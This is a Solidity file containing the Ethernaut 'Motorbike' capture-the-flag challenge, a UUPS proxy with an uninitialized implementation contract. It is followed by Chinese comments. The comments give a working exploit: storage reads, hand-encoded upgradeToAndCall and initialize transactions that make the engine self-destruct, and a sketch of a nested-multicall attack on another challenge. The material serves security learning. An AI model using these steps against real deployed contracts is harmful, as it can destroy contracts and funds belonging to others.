// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/utils/Initializable.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    struct AddressSlot {
        address value;
    }
    
    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`. 
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
    
    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        
        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
//Ethernaut的摩托车有一个全新的可升级的发动机设计。 
 
//你能自毁它的引擎，让摩托车无法使用吗? 
 
//可能有帮助的事情: 
 
//eip - 1967 UUPS可升级模式 Initializable合同

//await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")

//''0x0000 00000 00000 00000 00000292ee0532abf61e170d8364cd18df75a2d20b690''
//0x292ee0532abf61e170d8364cd18df75a2d20b690

//await web3.eth.getStorageAt("0x292ee0532abf61e170d8364cd18df75a2d20b690", "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
//'0x0000000000000000000000000000000000000000000000000000000000000000'

//web3.utils.sha3("attack()").slice(0,10)
//0x41c0e1b5

//部署合约地址：94c035b7d7C74A05F4FC804f00aF85487E8b10E5

//await web3.eth.sendTransaction({from:player, to:"0x292ee0532abf61e170d8364cd18df75a2d20b690", data:web3.utils.sha3("upgradeToAndCall(address,bytes)").slice(0,10) + "000000000000000000000000" + "94c035b7d7C74A05F4FC804f00aF85487E8b10E5" + "0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000441c0e1b5"})

//await web3.eth.sendTransaction({from:player, to:"0x292ee0532abf61e170d8364cd18df75a2d20b690", data:web3.utils.sha3("initialize()").slice(0,10)})


//采用UUPS模式的优点是需要部署的代理非常少。代理充当存储层，因此实现契约中的任何状态修改通常不会对使用它的系统产生副作用，因为只有通过委托调用使用逻辑。 
 
//这并不意味着如果我们不初始化实现契约，就不应该注意可能被利用的漏洞。 
 
//这是UUPS模式发布几个月后真正发现的内容的略微简化版本。 
 
//方法:永远不要让实现契约未初始化;) 
 
//如果你对发生了什么感兴趣，请在这里阅读更多。

//要使 admin 变为 player，则可以设置 maxBalance 为 player
//而 setMaxBalance 函数需要先使当前合约账户的余额变为 0
//合约账户余额减少的方式在 execute 中的 call，使余额减少 value
//但这样要使 balances[player] >= value
//而通过 deposit 增加 balances[player] 的话，合约账户余额也会同步增加
//所以要使用 multicall 函数来使 balances[player] 增加量为合约账户余额增加量的二倍
//但是 multicall 中检测了 selector 使 deposit 只能调用一次
//这可以通过 multicall 中执行两个 multicall，每个 multicall 调用一次 deposit


